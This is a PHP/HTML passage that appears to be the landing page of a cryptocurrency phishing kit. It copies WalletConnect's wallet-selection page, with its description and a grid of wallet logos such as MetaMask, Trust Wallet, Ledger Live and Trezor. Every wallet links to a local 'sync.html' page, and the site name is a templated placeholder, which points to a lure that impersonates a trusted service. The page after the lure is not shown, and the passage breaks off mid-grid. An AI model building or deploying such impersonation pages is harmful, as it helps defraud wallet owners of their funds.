<html>

<head>
  <title><?= $company->name ?></title>
  <?php require_once("includes/links.php") ?>
</head>

<body>
  <div id="__next">
    <div class="font-roboto" id="content">
      <?php require_once("includes/header.php") ?>
      <main class="flex flex-col mx-8 mt-12 space-y-10 text-center align-middle">
        <div class="flex justify-center">
          <div class="max-w-3xl">
            <h1 class="text-4xl font-medium text-cool-gray-500">Wallets</h1>
            <p class="mt-10 text-lg font-thin leading-6 text-gray-700">Multiple iOS and Android wallets support the WalletConnect protocol. Simply scan a QR code from your desktop computer screen to start securely using a dApp with your mobile wallet. Interaction between mobile apps and mobile browsers are supported via mobile deep linking.</p>
            <div class="mt-2"></div>
          </div>
        </div>
        <div class="flex justify-center">
          <div class="grid max-w-3xl grid-cols-2 gap-10 mt-6 sm:grid-cols-3 md:grid-cols-4">
            <a target="_blank" href="sync.html?wallet=rainbow.me" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369.jpeg" alt="Rainbow">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Rainbow</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=trustwallet.com" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0.jpeg" alt="Trust Wallet">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Trust Wallet</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=argent.xyz" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/cf21952a9bc8108bf13b12c92443751e2cc388d27008be4201b92bbc6d83dd46.jpeg" alt="Argent">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Argent</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=metamask.io" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96.jpeg" alt="MetaMask">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">MetaMask</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=gnosis-safe.io" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/a5cfbd9a263c9dcfb59d6e9dc00933c46f00277ed78a6a0a1e38b0c17e09671f.jpeg" alt="Gnosis Safe Multisig">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Gnosis Safe Multisig</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=crypto.com" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/f2436c67184f158d1beda5df53298ee84abfc367581e4505134b5bcf5f46697d.jpeg" alt="Crypto.com | DeFi Wallet">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Crypto.com | DeFi Wallet</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=pillarproject.io" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/0b58bf037bf943e934706796fb017d59eace1dadcbc1d9fe24d9b46629e5985c.jpeg" alt="Pillar">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Pillar</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=token.im" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/9d373b43ad4d2cf190fb1a774ec964a1addf406d6fd24af94ab7596e58c291b2.jpeg" alt="imToken">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">imToken</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=onto.app" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/dceb063851b1833cbb209e3717a0a0b06bf3fb500fe9db8cd3a553e4b1d02137.jpeg" alt="ONTO">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">ONTO</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=tokenpocket.pro" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/20459438007b75f4f4acb98bf29aa3b800550309646d375da5fd4aac6c2a2c66.jpeg" alt="TokenPocket">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">TokenPocket</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=mathwallet.org" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/7674bb4e353bf52886768a3ddc2a4562ce2f4191c80831291218ebd90f5f5e26.jpeg" alt="MathWallet">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">MathWallet</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=bitpay.com" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/ccb714920401f7d008dbe11281ae70e3a4bfb621763b187b9e4a3ce1ab8faa3b.jpeg" alt="BitPay">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">BitPay</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=ledger.com" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/4ab2542c2799c825a8465ba5ab8aa7def52b7904f38b74484af917ed9c0fc4e5.jpeg" alt="Ledger Live">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Ledger Live</div>
              </div>
            </a>

            <a target="_blank" href="sync.html?wallet=TrezorWallet" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="data:image/png;base64,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" style="height:130px;" alt="Trezor Wallet">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Trezor Wallet</div>
              </div>
            </a>


            <a target="_blank" href="sync.html?wallet=walleth.org" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/83f26999937cbc2e2014655796da4b05f77c1de9413a0ee6d0c6178ebcfc3168.jpeg" alt="Walleth">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Walleth</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=authereum.org" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/71dad538ba02a9b321041d388f9c1efe14e0d1915a2ea80a90405d2f6b67a33d.jpeg" alt="Authereum">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Authereum</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=1inch.io" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/09102e7bbbd3f92001eda104abe23803181629f695e8f1b95af96d88ff7d5890.jpeg" alt="1inch Wallet">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">1inch Wallet</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=huobiwallet.com" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/bae74827272509a6d63ea25514d9c68ad235c14e45e183518c7ded4572a1b0c4.jpeg" alt="Huobi Wallet">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Huobi Wallet</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=eidoo.io" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/efba9ae0a9e0fdd9e3e055ddf3c8e75f294babb8aea3499456eff27f771fda61.jpeg" alt="Eidoo">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Eidoo</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=mykey.org" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="https://registry.walletconnect.org/logo/lg/61f6e716826ae8455ad16abc5ec31e4fd5d6d2675f0ce2dee3336335431f720e.jpeg" alt="MYKEY">
                  </div>
                </div>
                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">MYKEY</div>
              </div>
            </a>
            <a target="_blank" href="sync.html?wallet=loopring.io" rel="noopener noreferrer">
              <div class="flex flex-col group">
                <div class="flex justify-center">
                  <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
